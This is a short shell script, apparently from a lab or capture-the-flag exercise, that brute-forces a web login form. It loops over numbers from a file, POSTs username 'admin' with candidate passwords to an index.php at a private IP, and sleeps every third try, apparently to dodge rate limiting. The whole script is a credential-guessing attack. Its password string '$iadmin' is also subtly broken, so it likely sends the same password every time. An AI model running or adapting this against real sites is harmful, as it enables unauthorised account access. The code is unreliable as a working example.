#!/bin/sh
 for i in $(cat numbers.txt)
 do
            echo item: $i
            
    if [ $(( $i % 3 )) -eq 0 ]; then  
            echo "$i"
            #then
            curl -d "username=admin&password=admin$iadmin&submit=Submit" -X POST http://10.10.221.201/index.php
        	sleep 60s
            else
            	curl -d "username=admin&password=admin$iadmin&submit=Submit" -X POST http://10.10.221.201/index.php
            fi
done
